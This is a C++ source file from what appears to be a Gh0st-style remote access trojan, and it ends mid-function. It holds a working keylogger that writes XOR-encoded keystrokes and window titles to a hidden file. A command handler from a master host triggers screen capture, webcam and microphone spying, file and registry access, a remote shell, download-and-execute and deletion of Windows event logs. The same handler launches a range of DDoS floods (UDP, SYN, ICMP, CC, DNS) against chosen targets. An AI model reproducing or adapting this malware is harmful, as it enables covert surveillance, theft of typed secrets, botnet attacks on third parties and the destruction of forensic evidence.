// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "KernelManager.h"
#include "SystemManager.h"
#include "loop.h"
#include "until.h"
#include "install.h"
#include <Tlhelp32.h>
#include "ddos.h"
#include "TCHAR.h"


#include <Windows.h>
#include <stdio.h>
#include <tchar.h>

#pragma warning(disable:4996)

#define TAG_DEV_PLAS  1
#define BITS_PER_PIX  32
#define NO_COLOR_TAB  0
#define UNCMP_RGB     0
#define H_RESOL_0     0
#define V_RESOL_0     0
#define ALL_COLOR     0

#define MUST_ZERO     0
#define TYPE_BMP      0x4D42

#define FILE_HEAD     sizeof(BITMAPFILEHEADER)
#define INFO_HEAD     sizeof(BITMAPINFOHEADER)
#define HEAD_SIZE     sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER)
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;

HINSTANCE	CKernelManager::g_hInstance = NULL;
DWORD		CKernelManager::m_dwLastMsgTime = GetTickCount();

///////////////////////////////////////////////////////////////////// key log
TCHAR KeyBuffer[2048]; 
void SaveToFile(TCHAR *lpBuffer)
{
	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, _T("\\MODIf.html"));
	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
	NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	DWORD dwSize = GetFileSize(hFile, NULL);
	if (dwSize < 1024 * 1024 * 50)
		SetFilePointer(hFile, 0, 0, FILE_END);
	// ����
	int	nLength = lstrlen(lpBuffer);
	TCHAR*	lpEncodeBuffer = new TCHAR[nLength];
	for (int i = 0; i < nLength; i++)
	lpEncodeBuffer[i] = lpBuffer[i] ^ _T('`');
	WriteFile(hFile, lpEncodeBuffer, lstrlen(lpBuffer)*sizeof(TCHAR), &dwBytesWrite, NULL);
	CloseHandle(hFile);	
	return ;
}
char* LowerCase[] = {
	//   	"b",
   //	    "e",
		   "[Enter]",
		   "[ESC]",
		   "[F1]",
		   "[F2]",
		   "[F3]",
		   "[F4]",
		   "[F5]",
		   "[F6]",
		   "[F7]",   //10
		   "[F8]",
		   "[F9]",
		   "[F10]",
		   "[F11]",
		   "[F12]",
		   "`",
		   "1",
		   "2",
		   "3",
		   "4",      //20
		   "5",
		   "6",
		   "7",
		   "8",
		   "9",
		   "0",
		   "-",
		   "=",
		   "[TAB]",
		   "q",        //30
		   "w",
		   "e",
		   "r",
		   "t",
		   "y",
		   "u",
		   "i",
		   "o",
		   "p",
		   "[",   //40
		   "]",
		   "a",
		   "s",
		   "d",
		   "f",
		   "g",
		   "h",
		   "j",
		   "k",
		   "l",    //50
		   ";",
		   "'",
		   "z",
		   "x",
		   "c",
		   "v",
		   "b",
		   "n",
		   "m",
		   ",",   //60
		   ".",
		   "/",
		   "\\",
		   "[CTRL]",
		   "[WIN]",
		   "[�ո�]",
		   "[WIN]",
		   "[Print Screen]",
		   "[Scroll Lock]",
		   "[Insert]",    //70
		   "[Home]",
		   "[PageUp]",//
   //		"[Del]",
		   "[Delete]",
		   "[End]",
		   "[PageDown]",//
		   "[Left]",
		   "[UP]",
		   "[Right]",
		   "[Down]",
		   "[Num Lock]",   //80
		   "/",
		   "*",
		   "-",
		   "+",
		   "0",
		   "1",
		   "2",
		   "3",
		   "4",
		   "5",        //90
		   "6",
		   "7",
		   "8",
		   "9",
		   ".",
		   "[INSERT]",
		   "[DELETE]",
		   "[BACKSPACE]",
		   "[CLEAR]",     //99
		   "[Alt]",     //100
		   "[Shift]",     //101
		   "[Pause Break]",     //102
};

char* UpperCase[] = {
	//	    "b",
	//		"e",
			"[Enter]",
			"[ESC]",
			"[F1]",
			"[F2]",
			"[F3]",
			"[F4]",
			"[F5]",
			"[F6]",
			"[F7]",  //10
			"[F8]",
			"[F9]",
			"[F10]",
			"[F11]",
			"[F12]",
			"~",
			"!",
			"@",
			"#",
			"$",   //20
			"%",
			"^",
			"&",
			"*",
			"(",
			")",
			"_",
			"+",
			"[TAB]",
			"Q",         //30
			"W",
			"E",
			"R",
			"T",
			"Y",
			"U",
			"I",
			"O",
			"P",
			"{",      //40
			"}",
			"A",
			"S",
			"D",
			"F",
			"G",
			"H",
			"J",
			"K",
			"L",      //50
			":",
			"\"",
			"Z",
			"X",
			"C",
			"V",
			"B",
			"N",
			"M",
			"<",   //60
			">",
			"?",
			"��",
			"[CTRL]",
			"[WIN]",
			"[�ո�]",
			"[WIN]",
			"[Print Screen]",
			"[Scroll Lock]",
			"[Insert]",     //70
			"[Home]",
			"[PageUp]",//
		//	"[Del]",
			"[Delete]",
			"[End]",
			"[PageDown]",//
			"[Left]",
			"[Up]",
			"[Right]",
			"[Down]",
			"[Num Lock]",  //80
			"/",
			"*",
			"-",
			"+",
			"0",
			"1",
			"2",
			"3",
			"4",
			"5",     //90
			"6",
			"7",
			"8",
			"9",
			".",
			"[INSERT]",
			"[DELETE]",
			"[BACKSPACE]",
			"[CLEAR]",     //99
			"[Alt]",     //100
			"[Shift]",     //101
			"[Pause Break]",     //102
};
int SpecialKeys[] = {
	//	    8,
			13,
			27,
			112,
			113,
			114,
			115,
			116,
			117,
			118,  //10
			119,
			120,
			121,
			122,
			123,
			192,
			49,
			50,
			51,
			52,   //20
			53,
			54,
			55,
			56,
			57,
			48,
			189,
			187,
			9,
			81,   //30
			87,
			69,
			82,
			84,
			89,
			85,
			73,
			79,
			80,
			219,  //40
			221,
			65,
			83,
			68,
			70,
			71,
			72,
			74,
			75,
			76,   //50
			186,
			222,
			90,
			88,
			67,
			86,
			66,
			78,
			77,
			188,   //60
			190,
			191,
			220,
			17,
			91,
			32,
			92,
			44,
			145,
			45,    //70
			36,
			33,//
			46,
			35,
			34,//
			37,
			38,
			39,
			40,
			144,   //80
			111,
			106,
			109,
			107,
			96,
			97,
			98,
			99,
			100,
			101,   //90
			102,
			103,
			104,
			105,
			110,
			46,
			45,
			8,
			12,   //99
			18,   //100 
			16,   //101
			19,   //102  //��Ϊ������ǰ���һ�� ������101
};

HWND PreviousFocus = NULL;
CHAR WindowCaption[1024] = { 0 };
HWND hFocus = NULL;
BOOL IsWindowsFocusChange()
{

	memset(WindowCaption, 0, sizeof(WindowCaption));
	hFocus = GetForegroundWindow();
	GetWindowText(hFocus, WindowCaption, sizeof(WindowCaption));


	BOOL ReturnFlag = FALSE;
	CHAR temp[1024] = { 0 };
	if (hFocus == PreviousFocus)
	{

	}
	else
	{
		if (lstrlen(WindowCaption) > 0)
		{
			SYSTEMTIME   s;
			GetLocalTime(&s);
			wsprintf(temp, "\r\n[����:]%s\r\n[ʱ��:]%d-%d-%d  %d:%d:%d\r\n", WindowCaption, s.wYear, s.wMonth, s.wDay, s.wHour, s.wMinute, s.wSecond);
			SaveToFile(temp);
			memset(temp, 0, sizeof(temp));
			memset(WindowCaption, 0, sizeof(WindowCaption));
			ReturnFlag = TRUE;
		}
		PreviousFocus = hFocus;
	}
	return ReturnFlag;
}
BOOL KeyStary = TRUE;
DWORD WINAPI KeyLogger(LPVOID lparam)
{
	if (KeyStary == FALSE)
	{
		//	MessageBox(NULL,NULL,NULL,NULL);
		return 0;
	}

	KeyStary = FALSE;

	int bKstate[256] = { 0 };
	int i, x;
	CHAR KeyBuffer[600] = { 0 };
	int state;
	int shift;
	memset(KeyBuffer, 0, sizeof(KeyBuffer));

	while (TRUE)
	{
		Sleep(10);
		if (lstrlen(KeyBuffer) != 0)
		{
			if (IsWindowsFocusChange())
			{
				//	lstrcat(KeyBuffer,"\r\n");
				//	lstrcat(KeyBuffer,"\n"); //ע�͵��������ճ������
				SaveToFile("[����:]");
				SaveToFile(KeyBuffer);
				memset(KeyBuffer, 0, sizeof(KeyBuffer));
			}
			else
			{
				//	lstrcat(KeyBuffer,"\n");//ע�͵��������ճ������
				SaveToFile(KeyBuffer);
				memset(KeyBuffer, 0, sizeof(KeyBuffer));

			}
		}

		//94
		for (i = 0; i < 101; i++)
		{
			shift = GetKeyState(VK_SHIFT);
			x = SpecialKeys[i];
			if (GetAsyncKeyState(x) & 0x8000)
			{
				//93
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 93))) //Caps Lock And Shift Is Not Pressed
				{
					bKstate[x] = 1;
				}
				else                                                                     //93
					if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 93))) //Caps Lock And Shift Is Pressed
					{
						bKstate[x] = 2;
					}
					else
						if (shift < 0)
						{
							bKstate[x] = 3;
						}
						else
							bKstate[x] = 4;
			}
			else
			{
				if (bKstate[x] != 0)
				{
					state = bKstate[x];
					bKstate[x] = 0;
					if (x == 8) //�˼�
					{
						// 						KeyBuffer[lstrlen(KeyBuffer) - 1] = 0;
						// 						continue;
						lstrcat(KeyBuffer, "<BackSpace>");
						SaveToFile(KeyBuffer);
						memset(KeyBuffer, 0, sizeof(KeyBuffer));
						continue;

					}
					else
						if (lstrlen(KeyBuffer) > 550)
						{
							SaveToFile(KeyBuffer);
							memset(KeyBuffer, 0, sizeof(KeyBuffer));
							continue;
						}
						else
							if (x == 13) //�س�
							{
								/*if (lstrlen(KeyBuffer) == 0)
								{
									continue;
								}*///��ȥ���Ļ� Enter�޷���¼
								lstrcat(KeyBuffer, "<Enter>\r\n");//�Զ�����
								SaveToFile(KeyBuffer);
								memset(KeyBuffer, 0, sizeof(KeyBuffer));
								continue;
							}
							else
							{
								if ((state % 2) == 1)
								{
									lstrcat(KeyBuffer, (CHAR*)UpperCase[i]);

								}
								else
									if ((state % 2) == 0)
									{
										lstrcat(KeyBuffer, (CHAR*)LowerCase[i]);


									}
							}
				}
			}
		}
	}
	return 0;
}

CKernelManager::CKernelManager(CClientSocket *pClient,LPCTSTR lpszKillEvent, LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
	// �������ӣ����ƶ˷��������ʾ����
	m_bIsActived = false;
}

CKernelManager::CKernelManager(CClientSocket *pClient):CManager(pClient)
{
	m_nThreadCount = 0;
}

void CKernelManager::StartUnLineHook()
{	
	m_hThread[m_nThreadCount++] = 
		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
}

void CKernelManager::init(CClientSocket *pClient,LPCTSTR lpszKillEvent, LPCTSTR lpszMasterHost, UINT nMasterPort)
{
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
	// �������ӣ����ƶ˷��������ʾ����
	m_bIsActived = false;
}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

BOOL SendMSG(SOCKET ss)
{
	if (send(ss,"OK",2,0) == SOCKET_ERROR)
		if(WSAGetLastError()!=WSAEWOULDBLOCK)
		{
			closesocket(ss);
			return 0;
		}
	return 1;
}

BOOL proc_tag = false;
TCHAR temp_proc[1024]={0};

BOOL isProcesin(LPTSTR lpProcess)
{
	HANDLE handle=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	PROCESSENTRY32* info=new PROCESSENTRY32;
    info->dwSize=sizeof(PROCESSENTRY32);
	if(Process32First(handle,info))
	{
		if(GetLastError()==ERROR_NO_MORE_FILES )
		{
			return false;
		}
		else{		
			if (strstr(strupr(info->szExeFile),strupr(lpProcess)) > 0) //��NOD32��ע�� ɱstrupr
			{
				return true;
			}
			while(Process32Next(handle,info)!=FALSE)
			{
				if (strstr(strupr(info->szExeFile),strupr(lpProcess)) > 0) //��NOD32��ע�� ɱstrupr
				{
					return true;
				}
			}
		}
	}
	return false;
	CloseHandle(handle);
}

BOOL CALLBACK EnumWindowsList(HWND hwnd, LPARAM lParam)
{
	TCHAR szClassName[254]={0};
	GetWindowText(hwnd,szClassName,254);
	if (strstr(szClassName,temp_proc) != NULL)
	{
		proc_tag = true;
	}
	return true;
}

// ���ϼ���
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);
		break;
	case COMMAND_DLLMAIN:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DLL,
			(lpBuffer + 1), 0, NULL);
		break;
	case COMMAND_GN: // С����
	{
		switch (lpBuffer[1])
		{
		case DESK_TOP:
		{
				//��ʾ����Ļ
				HDC hCurrScreen = GetDC(NULL);

				//����һ�����ݵ�DC,���ڴ��б�ʾ��ǰλͼ��������
				HDC hCmpDC = CreateCompatibleDC(hCurrScreen);

				//���
				int iScreenWidth = GetDeviceCaps(hCurrScreen, HORZRES);
				int iScreenHeight = GetDeviceCaps(hCurrScreen, VERTRES);

				//��ǰ��Ļλͼ
				HBITMAP hBmp = CreateCompatibleBitmap(hCurrScreen, iScreenWidth, iScreenHeight);

				//�õ�ǰλͼ�����ʾ�ڴ�����Ļλͼ������
				SelectObject(hCmpDC, hBmp);

				//����ǰ��Ļͼ���Ƶ��ڴ���
				BOOL ret = BitBlt(hCmpDC, 0, 0, iScreenWidth, iScreenHeight, hCurrScreen, 0, 0, SRCCOPY);

				//BMPͼ����Ϣͷ
				BITMAPINFOHEADER hBmpInfo;
				hBmpInfo.biSize = INFO_HEAD;
				hBmpInfo.biWidth = iScreenWidth;
				hBmpInfo.biHeight = iScreenHeight;
				hBmpInfo.biPlanes = TAG_DEV_PLAS;
				hBmpInfo.biClrUsed = NO_COLOR_TAB;
				hBmpInfo.biBitCount = BITS_PER_PIX;
				hBmpInfo.biSizeImage = UNCMP_RGB;
				hBmpInfo.biCompression = BI_RGB;
				hBmpInfo.biClrImportant = ALL_COLOR;
				hBmpInfo.biXPelsPerMeter = H_RESOL_0;
				hBmpInfo.biYPelsPerMeter = V_RESOL_0;

				/* * * * * * * * * * * * * * * * * * * *
				 * Windows��4�ֽڷ����ڴ�
				 * ���ȼ���ÿ������Ҫ��bit��,����4�ֽڶ���
				 * ���������ݳ�4,��DWORDתΪBYTE
				 * ÿ��ʵ����ռBYTE��ͼ�������õ�����Դ��С
				 * * * * * * * * * * * * * * * * * * * */
				DWORD dwSrcSize = ((iScreenWidth * hBmpInfo.biBitCount + 31) / 32) * 4 * iScreenHeight;

				//��ͼ�ܴ�С
				DWORD dwPicSize = HEAD_SIZE + dwSrcSize;

				//BMPͼ���ļ�ͷ
				BITMAPFILEHEADER hBmpFile;
				hBmpFile.bfSize = dwPicSize;
				hBmpFile.bfType = TYPE_BMP;
				hBmpFile.bfOffBits = HEAD_SIZE;
				hBmpFile.bfReserved1 = MUST_ZERO;
				hBmpFile.bfReserved2 = MUST_ZERO;

				//BMPͼ������Դ
				char* bmpSrc = new char[dwSrcSize];
				ZeroMemory(bmpSrc, dwSrcSize);

				//����ָ���ļ���λͼ�е�����λԪ����
				//�����Ƶ�ָ����ʽ���豸�޹�λͼ�Ļ�����
				GetDIBits(hCmpDC, hBmp, 0, (UINT)iScreenHeight, bmpSrc, (BITMAPINFO*)&hBmpInfo, DIB_RGB_COLORS);

				//��������������Ϣ
				char* szBmp = new char[dwPicSize];
				ZeroMemory(szBmp, dwPicSize);
				memcpy(szBmp, (void*)&hBmpFile, FILE_HEAD);
				memcpy(szBmp + FILE_HEAD, (void*)&hBmpInfo, INFO_HEAD);
				memcpy(szBmp + HEAD_SIZE, bmpSrc, dwSrcSize);
				LPBYTE	lpPacket = new BYTE[dwPicSize+2];
				lpPacket[0] = COMMAND_GN;
				lpPacket[1] = DESK_TOP;
				memcpy(lpPacket + 2, szBmp, dwPicSize  );
				m_pClient->Send(lpPacket, dwPicSize+2);
				//�ͷ���Դ
				DeleteObject(hBmp);
				DeleteObject(hCmpDC);
				ReleaseDC(NULL, hCurrScreen);
				delete[] szBmp;
				delete[] bmpSrc;
				delete[] lpPacket;
				szBmp = nullptr;
				bmpSrc = nullptr;
				
			
	/*		LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_OPEN_URL_HIDE;
			memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

			SendSelectCommand(lpPacket, nPacketLength);

			delete[] lpPacket;*/
				break;
		}

		default:
			break;
		}





	}

		break;
	case COMMAND_LIST_DRIVE: // �ļ�����
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY: // ��Ļ�鿴
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_newSCREEN_SPY: // ����Ļ�鿴
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_newScreenManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_WEBCAM: // ����ͷ
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_AUDIO: // ��˷�
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_SPEAKER: // ������
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SpeakerManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_SYSTEM: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_REGEDIT://ע������   
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SERMANAGER:       // �������
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SerManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_PROXY: //
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ProxyManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHOW_MSG:         // ������Ϣ
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_MessageBox,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
	case COMMAND_CHAT:             // Զ�̽�̸
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ChatManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SORT_PROCESS: // ����ɸѡ
		try
		{
			if (isProcesin((LPTSTR)(lpBuffer + 1)))
			{
				BYTE bToken = TOKEN_INFO_YES;
				m_pClient->Send(&bToken, 1);
			}
			else
			{
				BYTE bToken = TOKEN_INFO_NO;
				m_pClient->Send(&bToken, 1);
			}
		}catch(...){}
		break;
	case COMMAND_SORT_WINDOW: // ����ɸѡ
		try
		{
			strcpy(temp_proc,(LPTSTR)(lpBuffer + 1));
			EnumWindows(EnumWindowsList,0);
			if (proc_tag)
			{
				BYTE bToken = TOKEN_INFO_YES;
				m_pClient->Send(&bToken, 1);
				proc_tag = false;
			}
			else
			{
				BYTE bToken = TOKEN_INFO_NO;
				m_pClient->Send(&bToken, 1);
			}
		}catch(...){}
		break;
	case COMMAND_DDOS_ATTACK:
		{
			DATTACK m_Attack;
			memset(&m_Attack,0,sizeof(DATTACK));
			memcpy(&m_Attack,lpBuffer+1,sizeof(DATTACK));
			
//  			OutputDebugString("��ʼ����");
//  			puts("��ʼ����");
// 			OutputDebugString(m_Attack.Target);
// 			puts(m_Attack.Target);
// 			char	strTMP[MAX_PATH];
// 			wsprintf(strTMP, "Type: %d",m_Attack.AttackType);
// 			OutputDebugString(strTMP);
// 			puts(strTMP);
// 			wsprintf(strTMP, "Port:%d",m_Attack.AttackPort);
// 			OutputDebugString(strTMP);
// 			puts(strTMP);
// 			wsprintf(strTMP, "Time:%d",m_Attack.AttackTime);
// 			OutputDebugString(strTMP);
// 			puts(strTMP);
// 			wsprintf(strTMP, "Thread:%d",m_Attack.AttackThread);
// 			OutputDebugString(strTMP);
// 			puts(strTMP);
			
			if(m_Attack.AttackType==1)		//UDP Flood		1	Gh0st��DK
			{
				UDP_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==2)		//SYN Flood		2	����7.0
			{
				SYN_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==3)		//ICMP��ˮ		3	NB5.4����
			{
				ICMP_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==4)		//TCP Connect	4	NB5.4����
			{
				TCP_CONNECT(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==5)		//����˽������	5	NB5.4����
			{
				SF_SF(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==6)		//ACK����		6	����7.0
			{
				ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==7)		//α��ԴUDP(����)	UDP		7	����7.0
			{
				WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==8)		//���ܹ���		SYN		8	����7.0
			{
				OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ  //����ϵͳ��Ϣ
				OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
				GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // ע��ת������

				if ( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 0 )
				{
//					pszOS = _T("2000");
					ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
				}else
				if ( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 1 )
				{
//					pszOS = _T("XP");
					WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
				}else
				if ( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 2 )
				{
// 					pszOS = _T("2003");
					ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
				}else
				if ( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 0 )
				{
					if( OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
					{
//						pszOS = _T("Vista"); 
						WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
					else
					{
//						pszOS = _T("2008");
						ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
				}else
				if ( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 1 )
				{
					if( OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
					{
//						pszOS = _T("7");
						WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
					else
					{
//						pszOS = _T("2008R2");
						ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
				}else
				if ( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 2 )
				{
					if( OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
					{
//						pszOS = _T("8");
						WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
					else
					{
//						pszOS = _T("2012");
						ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
				}else
				{
					UDP_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
				}
			}
			if(m_Attack.AttackType==9)		//����CC����	9	DK����
			{
				CC_SINCON(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==10)		//HTTP GetЭ��	10	DK����
			{
				RST_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==11)		//�ֲ�ʽѭ��CC	11	DK����
			{
				LX_CC(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread,m_Attack.ExtendData1,m_Attack.ExtendData2);
			}
			if(m_Attack.AttackType==12)		//�Ʒ�CC	12	����7.0
			{
				Break_CC(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==13)		//DNS����
			{
				DNS_ATT(m_Attack.Target,m_Attack.DNSTarget,m_Attack.AttackTime);
			}
			if(SendMSG(m_pClient->m_Socket)==0)
				return;
		}
		break;
	case COMMAND_DDOS_STOP:
		{
//  			OutputDebugString("ֹͣ����");
// 			puts("ֹͣ����");
			StopDDOS();
			if(SendMSG(m_pClient->m_Socket)==0)
				return;
		}
		break;
	case COMMAND_SHELL: // Զ���ն�
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: // ���̼�¼ 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSINFO: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SysInfoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_DOWN_EXEC: // ������
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		Sleep(100); // ���ݲ�����
		break;
	case COMMAND_OPEN_URL_SHOW: // ��ʾ����ҳ
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // ���ش���ҳ
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // ж��,
		UnInstallService();
		break;
	case COMMAND_CLEAN_EVENT: // �����־
		CleanEvent();
		break;
	case COMMAND_CLEAN_System: // ���ϵͳ��־
		CleanSystem();
		break;
	case COMMAND_CLEAN_Security: // �����ȫ��־
		CleanSecurity();
		break;
	case COMMAND_CLEAN_Application: // ���������־
		CleanApplication();
		break;
	case COMMAND_SESSION:
		ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_UPDATE_SERVER: // ���·����
		if (UpdateServer((char *)lpBuffer + 1))
			UnInstallService();
		break;
	case COMMAND_RENAME_REMARK: // �ı�ע
		SetHostID((LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_CHANGE_GROUP: // �ķ���
		{
			char	*szGetGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "KLMN");
			if (szGetGroup == NULL)
			{
				return;
			}
			SetInfo(szGetGroup, (LPCTSTR)(lpBuffer + 1), "BITS");
		}
		break;
	case COMMAND_REPLAY_HEARTBEAT: // �ظ�������
		break;
	}	
}

extern char* MyDecode(char *str);
void CKernelManager::UnInstallService()
{
	//char	*szGetGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "KLMN");
	//if (szGetGroup == NULL)
	//{
	//	return;
	//}

	//char	*szGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "CDEF");
	//if (szGroup == NULL)
	//{
	//	return;
	//}
	//szGroup = (char *)(MyDecode(szGroup + 4));  //���ܱ����ܵ��ַ���
	//
	//char	strAudioListen[MAX_PATH];
	//char	strWebCam[MAX_PATH];
	//
	//GetWindowsDirectory( strAudioListen, sizeof(strAudioListen) );
	//lstrcat( strAudioListen, "\\BAudioListen.dll" );
	//DeleteFile(strAudioListen);
	//
	//GetWindowsDirectory( strWebCam, sizeof(strWebCam) );
